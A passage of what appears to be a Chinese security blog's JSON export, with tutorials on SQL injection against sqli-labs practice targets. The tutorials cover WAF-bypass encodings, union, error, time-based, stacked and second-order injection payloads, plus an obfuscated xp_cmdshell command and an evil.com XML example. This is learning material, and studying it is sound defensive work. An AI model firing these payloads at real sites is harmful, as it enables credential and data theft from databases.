开启代理，启动burp 发送到intruder中进行处理 3.选中需要进行批量化替换的关键词，添加编辑 4.添加字典 5.开始进行攻击 6.对结果进行判断： 这样依此猜解8次组合出完整的数据库名称。 结合sqlmap对url进行注入 有几个mysql内置的函数需要记住： length(str)：返回str字符串的长度。 substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len):跟上面的一样，截取字符串 ascii(str)：返回字符串str的最左面字符的ASCII代码值。 ord(str):同上，返回ascii码 if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 盲注需要一个字符一个字符的来判断，必须如先判断当前的数据库名的第一个字符是什么（可以使用sqlmap或脚本） 暴力破解漏洞修复建议如果用户登录次数超过设置的阀值，则锁定账号。 如果某个IP登录次数超过设置的阀值，则锁定IP 锁定IP存在的一个问题是：如果多个用户使用的是同·一个·IP，则会造成其他用户也不能登录。"}],"posts":[{"title":"","slug":"sql注入绕过技术","date":"2019-08-07T09:01:57.512Z","updated":"2019-08-07T10:01:51.725Z","comments":true,"path":"2019/08/07/sql注入绕过技术/","link":"","permalink":"http://yoursite.com/2019/08/07/sql注入绕过技术/","excerpt":"0x1 WAF的常见特征","text":"0x1 WAF的常见特征 之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。 总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能： \\1. 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话 \\2. 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式 \\3. 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。 \\4. WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。 WAF的常见特点： 异常检测协议：拒绝不符合HTTP标准的请求 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证 白名单&amp;黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活 状态管理：重点进行会话保护 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等 如果是对于扫描器，WAF有其识别之道： 扫描器识别主要由以下几点： 1) 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 2) 单IP+ cookie某时间段内触发规则次数 3) 隐藏的链接标签等() 4) Cookie植入 5) 验证码验证，扫描器无法自动填充验证码 6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404 0x2 绕过WAF的方法 从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧 a) 大小写混合 b)替换关键字 c)使用编码 d)使用注释 e)等价函数与命令 f)特殊符号 g)HTTP参数控制 h)缓冲区溢出 i)整合绕过 a) 大小写绕过大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术 举例：z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4 示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理 b)替换关键字这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过 举例：z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望 c)使用编码1.URL编码 在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29 普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT 2.十六进制编码 举例：z.com/index.php?page_id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4… SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) 示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点 3.Unicode编码 Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了 看一下常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9 举例：?id=10%D6‘%20AND%201=2%23 SELECT ‘Ä’=’A’; #1 两个示例中，前者利用双字节绕过，比如对单引号转义操作变成&#39;，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用 第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下 常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子 d) 使用注释看一下常见的用于注释的符号有哪些：//, – , /**/, #, –+,– -, ;**，–a 1.普通注释 举例：z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 ‘union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询 2.内联注释 相比普通注释，内联注释用的更多，它有一个特性/!**/只有MySQL能识别 举例：index.php?page_id=-15 /!UNION/ /!SELECT/ 1,2,3 ?page_id=null%0A///!50000%55nIOn//yoyu/all//%0A/!%53eLEct/%0A/nnaa/+1,2,3,4… 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用 e)等价函数与命令有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 1.函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 或者：substr((select ‘password’),1,1) = 0x70 strcmp(left(‘password’,1), 0x69) = 1 strcmp(left(‘password’,1), 0x70) = 0 strcmp(left(‘password’,1), 0x71) = -1 上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论 2.符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/ 3.生僻函数 MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘ ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,’a\\l\\x65rt(1)’as \\117n\\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制 f) 特殊符号这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多 先看下乌云drops上“waf的绕过技巧”一文使用的几个例子： 1.使用反引号，例如selectversion()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用 2.神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤 3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量 4.Mysql function() as xxx 也可不用as和空格 select-count(id)test from users; //绕过空格限制 可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到 本人搜罗了部分可能发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00 举例： 关键字拆分：‘se’+’lec’+’t’ %S%E%L%E%C%T 1 1.aspx?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell ”net user”’) !和()：’ or –+2=- -!!!’2 id=1+(UnI)(oN)+(SeL)(EcT) //另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔 本节最后在给出一些和这些字符多少有点关系的操作符供参考： &gt;&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段 g) HTTP参数控制这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 1.HPP(HTTP Parameter Polution) 举例：/?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/*/union/&amp;id=/select/&amp;id=/pwd/&amp;id=/from/&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式如下： 具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过 2.HPF(HTTP Parameter Fragment) 这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) 举例： /?a=1+union/&amp;b=/select+1,pass/&amp;c=/from+users– select * from table where a=1 union/* and b=/select 1,pass/ limit */from users— 看罢上面两个示例，发现和HPP最后一个示例很像，不同之处在于参数不一样，这里是在不同的参数之间进行分割，到了数据库执行查询时再合并语句。 3.HPC(HTTP Parameter Contamination) 这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染 RFC2396定义了如下一些字符： Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ () Reserved : ; / ? : @ &amp; = + $ , Unwise : { } | \\ ^ [ ] ` 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑： 以魔术字符%为例，Asp/Asp.net会受到影响 h) 缓冲区溢出(Advanced)缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过 举例： ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出 i) 整合绕过整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。 举例： z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--","categories":[],"tags":[]},{"title":"","slug":"sql注入的基础","date":"2019-08-07T09:01:57.504Z","updated":"2019-08-07T10:04:42.000Z","comments":true,"path":"2019/08/07/sql注入的基础/","link":"","permalink":"http://yoursite.com/2019/08/07/sql注入的基础/","excerpt":"web安全之SQL注入基础","text":"web安全之SQL注入基础 SQL注入基础SQL注入介绍Web请求响应过程： 什么是SQL注入？就是指web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。 为什么会产生sql注入?开发人员可以使用动态SQL语句创建通用，灵活的应用。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的sql语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段（如select语句）,或者根据不同的条件选择不同的查询表时，动态地构造SQL语句会非常有用。 Php语句为列： $query=“SELECT * FROM users WHERE id = $_GET[‘id’]”; 由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。 SQL注入的原理Sql注入漏洞的产生需要满足那两个条件？​ 参数用户可控：前端传给后端的参数内容是用户可以控制的。 ​ 参数带入数据库查询：传入的参数拼接到sql语句，且带入数据库查询。 当传入ID参数为1’时，数据库执行的代码如下所示。 sehlect * from users where id =1&#39; 这样是会报出错误的，因为这不符合数据库语法规范。 当传入的ID参数为and 1=1 时，执行的SQL语句如下所示。 select * from users where id = 1&#39; and 1=1 因为1=1为真，且where语句中id1=1也为真，所以页面会返回与id=1相同的结果。 当传入的ID参数为and 1=2时，由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果。 由此可以初步判断ID参数存在SQL注入漏洞，攻击者可以进一步拼接SQL语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。 ————————————————————————————————————————————————————— 在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉持“外部参数皆不可信的原则”进行开发。 ————————————————————————————————————————————————————— 与MySQL注入相关的知识点Mysql数据库数据库A=网站A ​ 表名 ​ 列名 ​ 数据 数据库 B=网站B 12数据库 在MySql5.0 版本之后，MySql默认在数据库中存放一个“information_schema”的数据库，在该库中，读者需要记住三个表名，分别是 SCHEMATA,TABLES,COLUMNS SCHEMNSz表存储该用户创建的所有数据库的库名，我们需要记住该表中记录数据库库名的字段名为SCHEMA_NAME TABLES表存储该用户创建的所有数据库的库名和表名，我们需要记住该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。 COLUMNS表名和字段名的字段名为TABLE_SCHEMA，TABLE_NAME和COLUMN_NAME。 Mysql查询语句 在不知道任何条件时，语句如下所示。 SELECT 要查询的字段名 FROM 库名.表名 在知道一条已知条件时，语句如下所示。 SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名=‘已知条件的值’ 在知道两条已知条件时，语句如下所示。 SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知道条件1的字段名=‘已知条件1的值’ AND 已知条件2的字段名=‘已知条件2的值’ Limit 的用法Limit的使用格式为limit m,n, 其中m是指记录开始的位置，从0开始，表示第一条记录;n是指取n条记录。 例如limit 0,1表示从第一条记录开始，取一条记录， 需要记住的几个函数Database():当前网站使用的数据库 Version():当前MySQL的版本 User():当前MySQL的用户 注释符号 在MySQL中，常见注释符的表达方式：#或-- 空格或/**/ 内联注释内联注释的形式：/! code/。内联注释可以用于整个SQL语句中，用来执行我们的SQL语句，下面举一个列： index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 Union（联合）注入攻击[在线靶场][http://43.247.91.228:84/Less-1/?id=1] http://127.0.0.1/sqli-labs/Less-1/?id=1 一、判断是否用(‘)做字符串引号http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and 1=1 --+ https://blog.csdn.net/qq_41630808/article/details/80570197 正常输出 出错代表没有闭合 说明没有用’可能没有用’ 或用了”或() http://127.0.0.1/sqli-labs/Less-1/?id=1%27and%201=2--+ 则是’’字符串注入 二、判断它所在的数据库有几列http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 3 --+ 判断是否有3列 正常 http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order by 4 --+ 判断是否有4列 错误 说明它输出的内容所在的数据库有3列 三、判断他显示的内容在数据库的第几列http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+ 则 Your Login name 在第二列Your Password在第三列 我选择在第二列输出我想要的内容 四、查找出当前用户权限http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,user(),3 --+ root权限 五、查找当前数据库http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,database(),3 --+ 当前数据库是 security六、查找security的表名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39;),3 --+ 表名是 emails,referers,uagents,users group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函 数参数(就是字段名)决定 七、查找users里的字段http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39;),3 --+ 八、查找用户名http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(username) from security.users),3 --+ 九、查找密码http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,(select group_concat(password) from security.users),3 --+ 这样 这个就完成了 已经拿到了账号密码 Union (联合) 注入代码分析在Union注入页面中，程序获取GET参数ID，将ID拼接到SQL语句中，在数据库中查询参数的ID对应的内容，然后将第一条查询结果中的username和address输出到页面， 由于是将数据输出到页面上的，所以利用Union语句查询其他数据，代码如下： ![ ](http://ww1.sinaimg.cn/large/007bHQE8gy1g58le58wz5j30ou0bo77h.jpg) 当访问id=1 union select 1,2,3时，执行的SQL语句为: `Select * from users where ‘id’=1 union select 1,2,3`` 此时sql语句可以分为select \\* from users where ‘id’=1和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。 （优化在源码中添加sql语句执行代码） Boolean (布尔型) 注入攻击1&#39; and length(database())&gt;=1--+ //判断数据库的长度 l&#39; and substr(database(),1,1)=‘t’ --+ //判断数据库第一个字母的值 l&#39; and substr(database(),2,1)=‘q’ --+ //判断数据库的第二个字母的值 l&#39; and ord(substr(database(),1,1))=115--+ //利用ord和ASCII判断数据库库名 l&#39; and substr(database(),2,1)=’q’--+ //利用substr判断数据库的库名 l&#39; and substr(select table_name from information_schema.table where table_schema=‘sql’ limit 0,1),1,1)=‘e’ --+ //利用substr判断数据库的表名 1. length(str)：返回str字符串的长度。 2. substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 3. mid(str,pos,len):跟上面的一样，截取字符串 4. ascii(str)：返回字符串str的最左面字符的ASCII代码值。 5. ord(str):同上，返回ascii码 6. if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 Boolean (布尔型)注入代码分析在Boolean注入页面中程序先获取GET参数ID,通过preg_match判断其中是否存在union/sleep/benchmark等危险字符。然后将参数ID拼接到SQL语句，从数据库中查询， 当访问id=1‘ or 1=1%23时，数据库执行的语句为selcet * from user where ‘id’=’1’ or 1=1#,由于or 1=1是永真条件，所有此时返回正常。当访问id=1‘ and 1=2%23时， 数据库执行的语句为select * from users where ‘id’ = ‘1’ and 1=2#, 由于and‘1‘ =’2‘ 是永假条件，所有此时页面肯定会返=返回错误。 报错注入攻击updatexml(1,concat(0x7e,(select user()),0x7e),1)–+ //利用updatexml获取user() ‘ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+ //利用updatexml获取database（） `‘ and updatexml(1,concat(0x7e,(select select schema_name from information_schema.schemata limit 0,1),0x7e),1)–+** //**利用报错注入获取数据库库名 ‘ and updatexml(1,concat(0x7e,(select select table_name from information_schema.tables where table_schema= ‘test’ limit 0,1),0x7e),1)–+ //利用报错注入获取数据库表名 12345678910111213141516## 报错注入攻击代码分析**在报错注入页面中，程序获取GET参数username 后，将username拼接到SQL语句中然后，然后到数据库查询。** ![](http://ww1.sinaimg.cn/large/007bHQE8gy1g58lsi2dz3j30ua0a9419.jpg) 输入username=1‘时，SQL语句为select * from user where ‘username’=‘1“。执行时会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor(),updatexml()等函数将要查询的内容输出到页面上。","categories":[],"tags":[]},{"title":"","slug":"sql语句的基础知识","date":"2019-08-07T09:01:57.502Z","updated":"2019-07-25T02:45:31.131Z","comments":true,"path":"2019/08/07/sql语句的基础知识/","link":"","permalink":"http://yoursite.com/2019/08/07/sql语句的基础知识/","excerpt":"","text":"http://www.w3school.com.cn/sql/sql_select.asp http://www.w3school.com.cn/sql/sql_select.asp","categories":[],"tags":[]},{"title":"","slug":"sql注入的进阶","date":"2019-08-07T09:00:43.140Z","updated":"2019-08-07T09:57:58.559Z","comments":true,"path":"2019/08/07/sql注入的进阶/","link":"","permalink":"http://yoursite.com/2019/08/07/sql注入的进阶/","excerpt":"报错注入攻击","text":"报错注入攻击 http://whc.dropsec.xyz/2017/04/16/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/ https://www.freebuf.com/column/158705.html 1234567查库 (select schema_name from information_schema.schemata limit m,n)查表 (select table_name from information_schema.columns where table_schema=’whc’ limit 0,1)查字段 (select column_name from information_schema.columns where table_schema=’whc’ limit 0,1)加上limit 是因为sqllab里面限制了回显的个数，实战里面应该用不到。 1． Floor 方式用法： select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a; 函数释义： 1234567rand() 随机数函数 产生0-1的随机数 count(_) 计数 floor() 向下取整函数，舍去小数点，比如：floor(1.3)=1 floor(rand()_2) 结果只有0和1 group by name 按name的首位字典顺序排列 concat() 连接括号里面的内容 select 1 from (table name) 派生表 此处有三个点，一是需要count计数，二是floor，取得0 or 1，进行数据的重复，三是group by进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为mysql 的bug 的问题。但是此处需要将rand(0)，rand()需要多试几次才行。 实列：在sqli less-5上进行测试 这里只用user()来做实例，其他爆表，爆字段直接代替user()就行了 id=1&#39; union select 1,count(*),concat(0x3a,0x3a,user(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+ 可以简化成这样： id=1&#39; and (select count(*) from information_schema.tables group by concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand(0)*2))) --+ 也可以改成这样： id=1&#39; and (select 1 from (select count(*),(concat(0x3a,user(),0x3a,floor(rand()*2)))name from information_schema.tables group by name)b --+ 语句分解： 1234567(select 1 from b) //在b上做派生表b=select count(_),name from information_schema.tables group by name //从information_schema里面选取那么的内容和计数的内容name=concat(0x3a,(查询内容),0x3a,floor(rand()_2)) //把:和查询内容，还有随机取整数 连接在一起具体为什么count(_),floor(rand(0)_2) group by 会报错，必须说这三个元素必须全部放在一个语句里才能报错。 解释下select 1 from table 它的作用就是 增加临时列，每行的列值是写在select后的数，这条sql语句中是1 rand(0) rand(1)和rand()的区别 rand()会随机报错，就是有可能报错，有的时候不会，rand(0)肯定会报错，rand(1)则一定不会报错。 所以要让他报错的话直接用rand(0) 2.xpath函数：主要的两个函数： Mysql5.1.5 updatexml():对xml进行查询和修改 extractvalue():对xml进行查询和修改 都是最大爆32位。 and updatexml(1,concat(0×26,(version()),0×26),1); and (extractvalue(1,concat(0×26,(version()),0×26))); Sqli-lab less5测试: Updatexml(): http://192.168.1.180/sqli-labs/Less-5/?id=1&#39; and updatexml(1,concat(0x26,database(),0x26),1);--+ Extractvalue():http://192.168.1.180/sqli-labs/Less-5/?id=1&#39; and extractvalue(1,concat(0x26,database(),0x26));--+ 时间盲注 它与Boolean注入的不同之处在于，时间注入是利用sleep()或benchmark()等函数让mysql的执行时间变长。 时间盲注多与IF（expr1,expr2,expr3）结合使用，此if语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2：否则返回值为expr3， [http://43.247.91.228:84/Less-9/?id=1’ and if(length(database](http://43.247.91.228:84/Less-9/?id=1&#39; and if(length(database)()))&gt;1,sleep(5),1)%23 //判断数据库的库名长度为多少 http://43.247.91.228:84/Less-9/?id=1’ and if(substr(database(),1,1)=’s’,sleep(5),1) //判断数据库名的第一个字 [在线靶场][http://43.247.91.228:84/Less-9/?id=1] 这里输入?id=1’ ?id=1”页面都没有变化，说明之前的注入方法都没用，包括boolean型盲注也都不行了。 尝试基于时间的盲注，这里需要介绍一个mysql内置的函数sleep(5) 表示执行这个函数时会延迟5秒。（每种数据库都有各自延时函数） 可以用F12看下网站处理这个请求正常需要的时间。 验证时间盲注输入http://43.247.91.228:84/Less-9/?id=1响应时间为1秒内。 输入：http://43.247.91.228:84/Less-9/?id=1’ and sleep(5)%23响应时间为5秒 利用burp进行抓包利用破解对a-z的字母进行穷举，得到数据库名。 时间注入代码分析 在时间注入页面中，程序获取GET参数ID，通过preg_match判断参数ID中是否存在Union危险字符，然后将参数ID拼接到SQL语句中。从数据库中查询SQL语句，如果有结果，则返回yes，否则返回no。当访问该页面时，代码根据数据库查询结果返回YES或no，而不返回数据库中的任何数据库，所以一页面上只会显示yes或no ，和Boolean注入不同的是，此处没有过滤sleep等字符， ​ 此处当访问id=1‘ and if (ord(substring(user(),1,1))=114,sleep(3),1)%23 由于user()为root，root第一个字符‘r’的ASCII值是114，所以SQL语句中if条件成立，执行sleep(3),页面会延迟3s，通过这种延迟即可判断sql语句的执行结果。 堆叠查询注入攻击堆叠查询可以执行多条语句，多语句之间以分号(;)隔开。堆叠查询注入就是利用这个特点。 ‘;select if(substr(user(),1,1)=’r’,sleep(3),1)%23 //利用堆叠注入获取数据 ‘;select if(substr((select table_name form information_schema.tables where table_schema=datables() limit 0,1),1,1)=’e’,sleep(3),1)%23 //利用堆载获取表名 堆载查询注入代码分析 在堆叠注入页面中，程序获取GET参数ID，使用PDO的方式进行数据查询，但仍然将参数ID拼接到查询语句中，导致PDO没有起到预编译的效果，程序仍然存在SQL注入漏洞。 ​ 使用POD执行SQL语句时，可以执行多语句，不过这样通常不能直接得到注入结果，因为POD只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据。访问：dd.php?id=1’;select if(ord(substing(user(),1,1))=114,sleep(3),1);%23时执行sql语句为： SELECT * FROM users where ‘id’ =’1’; select if(ord(substring(user(),1,1))=114,sleep(3),1);%23 此时SQL语句分为了两条，第一SELECT * FROM user where ‘id‘ =’1‘是代码自己的selct查询，而selct if(ord(substring(user(),1,1))=114,sleep(3),1)%23则是我们构造的时间盲注的语句。 二次注入攻击什么是二次注入?二次注入是指已存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入。 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。 普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。 二次注入原理二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了addslashes或者是借助 get_magic_quotes_gpc对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 二次注入攻击实列[靶场练习地址][http://43.247.91.228:84/Less-24/] 二次注入的实例——SQLIlab lesson-24 学习SQL注入，必定要刷SQLIlab，这里以SQLIlab lesson-24为例，也是考察的二次注入的点。打开题目 这题正常的流程是首先注册一个账号，然后登陆进去会让你修改新的密码： 如果直接尝试在登陆处尝试SQL注入，payload: admin’#发现失败： 看一下源代码： 登陆处的username和password都经过了mysql_real_escape_string函数的转义，直接执行SQL语句会转义’，所以该处无法造成SQL注入。 Ok，此时我们注册一个test’#的账号： 注册用户的时候用了mysql_escape_string过滤参数： 但是数据库中还是插入了问题数据test’# 也就是说经过mysql_escape_string转义的数据存入数据库后被还原，这里做了一个测试： 回到题目，此时，test用户的原来密码为test，我们以test’#用户登陆，再进行密码修改 我们无需填写current password即可修改test用户的密码： 我们再看一下test用户的密码： Ok，我们看一下源代码： Username直接从数据库中取出，没有经过转义处理。在更新用户密码的时候其实执行了下面的命令： “UPDATEusers SET PASSWORD=’22′ where **username=’test’#**‘ and password=’$curr_pass’”; 因为我们将问题数据存储到了数据库，而程序再取数据库中的数据的时候没有进行二次判断便直接带入到代码中，从而造成了二次注入； ​ 二次注入代码分析以下代码实现了简单的用户注册功能，程序获取到GET参数username和参数password，然后将username和password拼接到SQL语句，使用insert 语句插入数据库中，由于参数username使用addslashes进行转义，参数password进行了MD5哈希，所以此处不存在SQL注入漏洞。 当访问username=test’&amp;password=123456时，执行的SQL语句为： Insert into users(‘username’,’password’) values (‘test\\’’,’ E10ADC3949BA59ABBE56E057F20F883E’) 数据库中就会存在一条名为test‘的用户 宽字节注入攻击什么是宽字节注入？如今有很多人在编码的时候，大多数人对程序的编码都使用unicode编码，网站都使用utf-8来一个统一国际规范。但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，比如gbk，作为自己默认的编码类型。也有一些cms为了考虑老用户，所以出了gbk和utf-8两个版本。一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。 至于mysql宽字节注入的原理就是因为数据库使用了GBK编码 宽字节注入原理GBK 占用两字节 ASCII占用一字节 